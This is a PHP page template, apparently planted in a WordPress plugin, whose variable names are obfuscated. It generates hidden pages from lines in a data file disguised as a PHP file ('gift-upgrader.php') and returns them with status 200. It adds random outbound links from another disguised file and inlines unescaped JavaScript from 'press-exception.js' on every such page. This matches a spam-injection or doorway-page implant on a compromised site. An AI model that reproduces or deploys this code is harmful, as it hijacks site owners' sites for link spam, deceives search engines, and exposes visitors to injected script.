<?php
$mF4EC1 = intval(get_query_var('xogejd'));

if ($mF4EC1 < 1 || $mF4EC1 > 4077) return;
$faY65ul = file(plugin_dir_path(__FILE__).'gift-upgrader.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$s8qspi4nEQ = explode(';', $faY65ul[$mF4EC1]);
if (count($s8qspi4nEQ) < 2) return;
$a8GwvRrF = $s8qspi4nEQ[0];
$iDzpVs  = $s8qspi4nEQ[1];
$hSO38X = $s8qspi4nEQ[2];
$fUfpBMqjCc  = $s8qspi4nEQ[3];
$zI5he = $s8qspi4nEQ[4];
set_query_var('wwmkyrkv', $a8GwvRrF);

$qniWzw1 = '';
$yfzyGm4YN = plugin_dir_path(__FILE__).'groups-site.php';
if (is_file($yfzyGm4YN)) {
	$dVgZDZ4o2Q = file($yfzyGm4YN, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($dVgZDZ4o2Q);
	shuffle($dVgZDZ4o2Q);
	$vcTmA = mt_rand(2, 5);
	if (count($dVgZDZ4o2Q) > $vcTmA) {
		for ($xkD6tDn7w = 0; $xkD6tDn7w < $vcTmA; $xkD6tDn7w++) {
			$kT1dN = array_shift($dVgZDZ4o2Q);
			$qniWzw1 .= '<p><a href="'.$kT1dN.'">'.$kT1dN.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $a8GwvRrF; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $iDzpVs . "</p>\n";
				if (strlen($fUfpBMqjCc) > 0) echo "<p>" . $fUfpBMqjCc . "</p>\n";
				if (strlen($hSO38X) > 0) echo "<p>" . $hSO38X . "</p>\n";
				if (strlen($zI5he) > 0) echo '<p><a href="#"><img src="'.$zI5he.'"></a>' . "</p>\n";
				echo $qniWzw1;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$dwIvb = plugin_dir_path(__FILE__) . 'press-exception.js';
if (is_file($dwIvb)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($dwIvb);
	echo '</script>';
}
get_footer();
?>
